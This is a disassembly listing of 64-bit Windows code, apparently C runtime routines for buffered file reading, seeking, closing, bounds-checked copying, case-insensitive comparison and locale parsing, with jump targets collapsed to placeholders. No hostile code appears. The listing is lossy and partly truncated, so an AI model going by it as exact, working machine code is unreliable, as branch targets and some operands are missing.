add rsp 0x50
pop rdi
retn
sub_14003b01c
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov r13 rcx
mov r14 rcx
mov [ rsp + 0x68 ] rcx
mov rcx rdx
mov r15 r9
mov r12 r8
mov rsi rdx
mov [ rsp + 0x70 ] rdx
test r8 r8
je r-xdata
xor eax eax
test r9 r9
je r-xdata
test r14 r14
jne r-xdata
mov rdi [ rsp + 0x80 ]
test rdi rdi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
cmp rsi 0xffffffffffffffff
je r-xdata
xor edx edx
or rax 0xffffffffffffffff
div r12
cmp r9 rax
jbe r-xdata
test rdi rdi
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r13
call sub_14003d760
mov rcx rsi
mov rbx r12
imul rbx r15
test [ rdi + 0x18 ] 0x10c
mov rbp rbx
je r-xdata
xor edx edx
or rax 0xffffffffffffffff
div r12
cmp r15 rax
ja r-xdata
mov r9d 0x1000
mov r9d [ rdi + 0x24 ]
jmp r-xdata
mov rax r15
jmp r-xdata
test [ rdi + 0x18 ] 0x10c
mov r10d 0x7fffffff
je r-xdata
mov [ rsp + 0x60 ] r9d
test rbx rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r8d r9d
cmp rbp r8
jb r-xdata
movsxd r14 [ rdi + 0x8 ]
test r14d r14d
je r-xdata
mov rcx rdi
call sub_140043e10
cmp eax 0xffffffff
je r-xdata
test r9d r9d
je r-xdata
mov r14 [ rsp + 0x68 ]
js r-xdata
sub rbx rbp
xor edx edx
mov rax rbx
div r12
jmp r-xdata
mov rcx [ rsp + 0x70 ]
test rcx rcx
je r-xdata
mov r14d ebp
cmp rbp r10
cmova r14d r10d
xor edx edx
cmp rbp r10
jbe r-xdata
or [ rdi + 0x18 ] 0x20
cmp rbp r14
cmovb r14d ebp
mov r9d r14d
cmp r9 rcx
ja r-xdata
cmp rsi 0xffffffffffffffff
je r-xdata
mov [ r14 ] al
mov r9d [ rdi + 0x24 ]
dec rbp
inc r14
dec rcx
mov [ rsp + 0x60 ] r9d
mov rcx rdi
call sub_14003be60
mov r8d r14d
mov r14 [ rsp + 0x68 ]
mov rdx r14
mov ecx eax
call sub_140044688
test eax eax
je r-xdata
mov rax rbp
mov r14d ebp
div r8
mov eax r10d
mov r14d r10d
div r9d
jmp r-xdata
mov r8 [ rdi ]
mov rdx rcx
mov rcx [ rsp + 0x68 ]
call sub_14003b740
sub [ rdi + 0x8 ] r14d
mov eax r14d
mov r14 [ rsp + 0x68 ]
sub rbp rax
add [ rdi ] rax
call sub_14003f1a4
mov [ rax ] 0x22
jmp r-xdata
mov r8 rsi
xor edx edx
mov rcx r13
call sub_14003d760
je r-xdata
or [ rdi + 0x18 ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax r14d
cmp rax rcx
ja r-xdata
sub r14d edx
jmp r-xdata
mov [ rsp + 0x68 ] r14
mov [ rsp + 0x70 ] rcx
test rbp rbp
jmp r-xdata
call sub_140043760
mov eax eax
sub rbp rax
jmp r-xdata
mov rcx [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
add r14 rax
sub rcx rax
jmp r-xdata
sub_14003b254
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov rsi r9
mov r13 r8
mov rdi rdx
mov r12 rcx
test r8 r8
je r-xdata
xor eax eax
test r9 r9
je r-xdata
mov rbx [ rsp + 0x60 ]
test rbx rbx
jne r-xdata
mov rcx rbx
call sub_14003bd5c
nop
mov [ rsp + 0x20 ] rbx
mov r9 rsi
mov r8 r13
mov rdx rdi
mov rcx r12
call sub_14003b01c
mov rdi rax
mov rcx rbx
call sub_14003bdf4
mov rax rdi
jmp r-xdata
cmp rdx 0xffffffffffffffff
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
jmp r-xdata
mov r8 rdx
xor edx edx
call sub_14003d760
sub_14003b31c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_14003be60
cmp [ rbx + 0x8 ] 0x0
movsxd r12 eax
jge r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor edx edx
mov ecx r12d
lea r8d [ rdx + 0x1 ]
call sub_140044b10
mov esi eax
test eax eax
js r-xdata
and [ rbx + 0x8 ] 0x0
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ rbx + 0x18 ]
test edx 0x108
jne r-xdata
mov edi [ rbx ]
lea r8 [ rw-data ]
mov ebp edi
sub ebp [ rbx + 0x10 ]
test dl 0x3
je r-xdata
sub esi [ rbx + 0x8 ]
mov eax esi
jmp r-xdata
test dl dl
js r-xdata
mov rcx r12
mov rax r12
sar rax 0x5
and ecx 0x1f
mov rax [ r8 + rax * 8 ]
imul rcx rcx 0x58
test [ rax + rcx + 0x8 ] 0x80
je r-xdata
test esi esi
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
jmp r-xdata
mov rax [ rbx + 0x10 ]
jmp r-xdata
test dl 0x1
je r-xdata
mov eax ebp
jmp r-xdata
cmp rax [ rbx ]
jb r-xdata
lea eax [ rbp + rsi ]
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
cmp [ rax ] 0xa
jne r-xdata
sub edi [ rbx + 0x10 ]
mov r13 r12
mov r14 r12
add edi [ rbx + 0x8 ]
sar r14 0x5
and r13d 0x1f
mov rax [ r8 + r14 * 8 ]
imul r13 r13 0x58
test [ r13 + rax + 0x8 ] 0x80
je r-xdata
xor ebp ebp
jmp r-xdata
inc rax
inc ebp
sub esi edi
xor edx edx
mov ecx r12d
lea r8d [ rdx + 0x2 ]
call sub_140044b10
cmp eax esi
jne r-xdata
xor r8d r8d
mov edx esi
mov ecx r12d
call sub_140044b10
test eax eax
js r-xdata
mov rax [ rbx + 0x10 ]
mov ecx edi
add rcx rax
jmp r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
cmp rax rcx
jb r-xdata
mov edi [ rbx + 0x24 ]
test [ rbx + 0x18 ] 0x8
je r-xdata
cmp [ rax ] 0xa
jne r-xdata
test [ rbx + 0x18 ] 0x2000
jmp r-xdata
inc edi
test [ rbx + 0x18 ] 0x400
mov edi eax
je r-xdata
inc rax
inc edi
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r14 * 8 ]
test [ r13 + rax + 0x8 ] 0x4
sub_14003b4d4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
call sub_14003bd5c
nop
mov rcx rbx
call sub_14003b31c
mov edi eax
mov rcx rbx
call sub_14003bdf4
mov eax edi
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14003b52c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
mov edi r8d
mov esi edx
mov rbx rcx
test al 0x83
jne r-xdata
and eax 0xffffffef
xor ebp ebp
mov [ rcx + 0x18 ] eax
cmp r8d 0x1
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
or eax 0xffffffff
jmp r-xdata
mov rcx rbx
call sub_14003ed0c
mov r11d [ rbx + 0x18 ]
test r11b r11b
jns r-xdata
call sub_14003b31c
mov edi ebp
add esi eax
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
test r11b 0x1
je r-xdata
and r11d 0xfffffffc
mov [ rbx + 0x18 ] r11d
jmp r-xdata
mov rcx rbx
call sub_14003be60
mov r8d edi
mov edx esi
mov ecx eax
call sub_140044b10
cmp eax 0xffffffff
setne bpl
lea eax [ rbp - 0x1 ]
test r11b 0x8
je r-xdata
bt r11d 0xa
jb r-xdata
mov [ rbx + 0x24 ] 0x200
sub_14003b5e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov ebx r8d
mov esi edx
mov rdi rcx
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
call sub_14003bd5c
nop
mov r8d ebx
mov edx esi
mov rcx rdi
call sub_14003b52c
mov ebx eax
mov rcx rdi
call sub_14003bdf4
mov eax ebx
cmp ebx 0x1
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
cmp ebx 0x2
jne r-xdata
sub_14003b65c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_14003ed0c
mov rcx rbx
mov edi eax
call sub_140044d70
mov rcx rbx
call sub_14003be60
mov ecx eax
call sub_140044cac
test eax eax
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_14003ad04
and [ rbx + 0x28 ] 0x0
sub_14003b6d8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
call sub_14003bd5c
nop
mov rcx rbx
call sub_14003b65c
mov edi eax
mov rcx rbx
call sub_14003bdf4
jmp r-xdata
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax edi
jmp r-xdata
sub_14003b740
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi r8
mov rdi rdx
test r9 r9
jne r-xdata
test rcx rcx
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
je r-xdata
call sub_14003f1a4
mov ebx 0x16
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov r8 rdx
xor edx edx
call sub_14003d760
test rsi rsi
je r-xdata
cmp rdx rbx
jb r-xdata
cmp rdi rbx
jae r-xdata
mov r8 rbx
mov rdx rsi
call sub_14003a8c0
jmp r-xdata
mov eax 0x16
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_140043760
mov eax ebx
jmp r-xdata
sub_14003b7c8
push rbx
sub rsp 0x20
mov rax r8
test r9 r9
je r-xdata
xor eax eax
test rcx rcx
jne r-xdata
test rax rax
je r-xdata
call sub_14003f1a4
mov ebx 0x16
cmp rdx r9
jae r-xdata
add rsp 0x20
pop rbx
retn
mov r8 r9
mov rdx rax
call sub_14003a8c0
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_140043760
mov eax ebx
jmp r-xdata
sub_14003b894
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r9d r9d
mov r11 rdx
mov [ rsp ] r9
mov [ rsp + 0x8 ] r9
mov [ rsp + 0x10 ] r9
mov [ rsp + 0x18 ] r9
mov r10 rcx
jmp r-xdata
mov edx 0x1
test al al
jne r-xdata
movzx r8d al
movzx eax al
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r11
mov al [ r11 ]
or [ rsp ] dl
jmp r-xdata
movzx r8d [ r10 ]
mov ecx r8d
shr r8 0x3
and ecx 0x7
shl edx cl
test [ rsp + r8 ] dl
je r-xdata
inc r9d
mov edx 0x1
inc r10
movsxd rax r9d
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x38
retn
sub_14003b928
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movups xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_140043c34
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
cmp rdx [ rw-data ]
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_140045f2c
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_140046220
mov [ rbx + 0x8 ] rax
sub_14003b9cc
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rax - 0x28 ]
mov rdx r8
call sub_14003b928
xor ebp ebp
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rsp + 0x38 ] bpl
je r-xdata
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x14 ] ebp
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
movzx ecx [ rsi ]
lea rdx [ rsp + 0x20 ]
call sub_1400467ec
movzx ecx [ rdi ]
lea rdx [ rsp + 0x20 ]
movzx ebx ax
add rsi 0x2
call sub_1400467ec
add rdi 0x2
test bx bx
je r-xdata
sub rsi rdi
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x38 ] bpl
je r-xdata
cmp bx ax
je r-xdata
movzx eax [ rdi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
add rdi 0x2
test bx bx
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
cmp bx ax
je r-xdata
add ax 0x20
movzx ebx [ rsi + rdi ]
cmp bx 0x41
jb r-xdata
jmp r-xdata
sub_14003bad0
sub rsp 0x28
xor r8d r8d
mov r9 rcx
cmp [ rw-data ] r8d
jne r-xdata
add rsp 0x28
jmp sub_14003b9cc
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0x7fffffff
add rsp 0x28
retn
sub r9 rdx
movzx ecx [ rdx ]
cmp cx 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
add rdx 0x2
test ax ax
je r-xdata
cmp cx 0x5a
ja r-xdata
add ax 0x20
movzx ecx cx
movzx eax ax
sub eax ecx
add rsp 0x28
retn
cmp ax cx
je r-xdata
add cx 0x20
movzx eax [ r9 + rdx ]
cmp ax 0x41
jb r-xdata
sub_14003bb58
push rdi
sub rsp 0x20
mov r10 r8
xor r8d r8d
test r9 r9
jne r-xdata
test rcx rcx
jne r-xdata
xor eax eax
jmp r-xdata
test r10 r10
je r-xdata
call sub_14003f1a4
mov edi 0x16
add rsp 0x20
pop rdi
retn
test rdx rdx
je r-xdata
cmp rdx r9
jb r-xdata
test r10 r10
je r-xdata
mov rdi rcx
movzx eax r8w
mov rcx rdx
[ rdi ]
lea r8 [ r9 + r9 ]
mov rdx r10
call sub_14003a8c0
jmp r-xdata
cmp rdx r9
jae r-xdata
mov eax 0x16
call sub_14003f1a4
mov edi 0x22
jmp r-xdata
mov [ rax ] edi
call sub_140043760
mov eax edi
jmp r-xdata
sub_14003bbd4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
call sub_140046974
mov edx 0x2
lea rcx [ rax + 0x1 ]
mov rsi rax
call sub_140046930
mov rdi rax
test rax rax
je r-xdata
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_1400468c4
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov rax rdi
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_14003bc54
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_140041704
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_140041704
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
dec rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
dec r9
jne r-xdata
sub_14003bd5c
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_140046c48
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_14003bdc0
push rbx
sub rsp 0x20
mov rbx rdx
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_140046c48
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_14003bdf4
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
jmp [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
jmp sub_140046b48
sub_14003be88
mov [ rsp + 0x8 ] rbx
movsxd r8 ecx
lea rbx [ rw-data ]
mov r9 r8
and r8d 0x1f
sar r9 0x5
imul r8 r8 0x58
mov rcx [ rbx + r9 * 8 ]
mov al [ rcx + r8 + 0x38 ]
movzx r11d [ rcx + r8 + 0x8 ]
add al al
and r11d 0x80
movsx r10d al
sar r10d 0x1
cmp edx 0x4000
je r-xdata
or [ rcx + r8 + 0x8 ] 0x80
mov rcx [ rbx + r9 * 8 ]
and [ rcx + r8 + 0x38 ] 0x80
cmp edx 0x8000
je r-xdata
neg r10d
sbb eax eax
and eax 0xc000
add eax 0x4000
mov eax 0x8000
jmp r-xdata
and [ rcx + r8 + 0x8 ] 0x7f
jmp r-xdata
cmp edx 0x10000
je r-xdata
mov rbx [ rsp + 0x8 ]
retn
test r11d r11d
jne r-xdata
or [ rcx + r8 + 0x8 ] 0x80
mov rax [ rbx + r9 * 8 ]
and [ rax + r8 + 0x38 ] 0x82
or [ rax + r8 + 0x38 ] 0x2
jmp r-xdata
cmp edx 0x20000
je r-xdata
cmp edx 0x40000
jne r-xdata
or [ rcx + r8 + 0x8 ] 0x80
mov rax [ rbx + r9 * 8 ]
and [ rax + r8 + 0x38 ] 0x81
or [ rax + r8 + 0x38 ] 0x1
jmp r-xdata
sub_14003bf58
sub rsp 0x28
test rcx rcx
jne r-xdata
mov eax [ rw-data ]
mov [ rcx ] eax
xor eax eax
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0x16
jmp r-xdata
add rsp 0x28
retn
sub_14003bf88
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
sub rsp 0x20
mov ebx edx
movsxd rdi ecx
cmp edx 0x4000
je r-xdata
cmp edi 0xfffffffe
jne r-xdata
cmp edx 0x8000
je r-xdata
test ecx ecx
js r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
cmp edx 0x10000
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
cmp edx 0x40000
je r-xdata
mov rsi rdi
mov r12 rdi
sar r12 0x5
lea r13 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r13 + r12 * 8 ]
movsx ecx [ rsi + rax + 0x8 ]
and ecx 0x1
je r-xdata
cmp edx 0x20000
je r-xdata
mov ecx edi
call sub_140046e5c
nop
mov rax [ r13 + r12 * 8 ]
test [ rsi + rax + 0x8 ] 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
or ebx 0xffffffff
mov edx ebx
mov ecx edi
call sub_14003be88
mov ebx eax
jmp r-xdata
call sub_140043760
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov ecx edi
call sub_140046f04
mov eax ebx
jmp r-xdata
sub_14003c084
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0xd
call sub_140046c48
nop
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov ecx 0xd
call sub_140046b48
cmp [ rbx ] 0x0
je r-xdata
[ rcx ]
jne r-xdata
mov eax 0xbaadf00d
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov rcx rbx
call sub_14003ad04
add rsp 0x20
pop rbx
mov ecx 0xc
call sub_140046c48
nop
mov rcx [ rbx ]
call sub_140045cb4
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
mov ecx 0xc
call sub_140046b48
cmp [ rcx ] 0x0
jne r-xdata
call sub_14003ad04
nop
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
call sub_140045d58
nop
sub_14003c12c
test r8d r8d
jle r-xdata
retn
mov [ rsp + 0x18 ] r8d
mov [ rsp + 0x20 ] r9
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
lea rdi [ rsp + 0x78 ]
xor ebx ebx
mov rsi rdx
add rdi 0xfffffffffffffff8
mov rbp rcx
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
inc ebx
cmp ebx [ rsp + 0x70 ]
jl r-xdata
add rdi 0x8
mov rdx rsi
mov rcx rbp
mov r8 [ rdi ]
call sub_1400489c4
test eax eax
jne r-xdata
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
sub_14003c194
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov rbx rdx
mov r8d 0x90
xor edx edx
mov rsi rcx
call sub_14003d760
cmp [ rbx ] 0x0
jne r-xdata
cmp [ rbx ] 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
xor ebp ebp
lea r8 [ rbx + 0x1 ]
cmp [ r8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
or eax 0xffffffff
lea r12 [ rax + rbx ]
mov dil [ r12 ]
test ebp ebp
jne r-xdata
mov edx 0x10
lea rcx [ rsi + 0x80 ]
lea r9d [ rdx - 0x1 ]
call sub_140048a40
test eax eax
jne r-xdata
cmp ebp 0x1
jne r-xdata
cmp rax 0x40
jae r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov [ rsi + 0x8f ] al
jmp r-xdata
cmp ebp 0x2
jne r-xdata
cmp rax 0x40
jae r-xdata
cmp dil 0x2e
je r-xdata
cmp rax 0x10
jae r-xdata
cmp dil 0x5f
je r-xdata
lea edx [ rbp + 0x40 ]
mov r9 rax
mov r8 rbx
mov rcx rsi
call sub_140048a40
test eax eax
je r-xdata
test dil dil
je r-xdata
lea rcx [ rsi + 0x40 ]
lea edx [ rbp + 0x3f ]
mov r9 rax
mov r8 rbx
call sub_140048a40
test eax eax
je r-xdata
cmp dil 0x2c
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
lea rcx [ rsi + 0x80 ]
mov r9 rax
mov r8 rbx
mov edx 0x10
call sub_140048a40
test eax eax
jne r-xdata
cmp dil 0x2c
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
test dil dil
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
lea rbx [ r12 + 0x1 ]
inc ebp
jmp r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_14003b894
test rax rax
je r-xdata
sub_14003c344
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx r8
mov rdi rdx
mov rsi rcx
call sub_140042dcc
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
lea rax [ rbx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
lea rax [ rbx + 0x80 ]
cmp [ rax ] 0x0
je r-xdata
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_14003c12c
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_14003c12c
sub_14003c3dc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rdi rcx
mov ecx 0x355
mov r12d 0x1
call sub_140041684
xor r15d r15d
mov rsi rax
test rax rax
jne r-xdata
lea rbp [ rax + 0x4 ]
mov ebx 0x351
mov r8d 0x3
mov [ rbp ] r15b
mov [ rax ] r12d
mov rax [ rdi + 0x68 ]
mov r9 [ r--data ]
mov [ rsp + 0x28 ] rax
lea rax [ r--data ]
mov edx ebx
mov rcx rbp
mov [ rsp + 0x20 ] rax
call sub_14003c12c
lea r13 [ r--data ]
lea r14 [ rdi + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r15
call sub_1400436bc
int3
mov rcx [ r14 ]
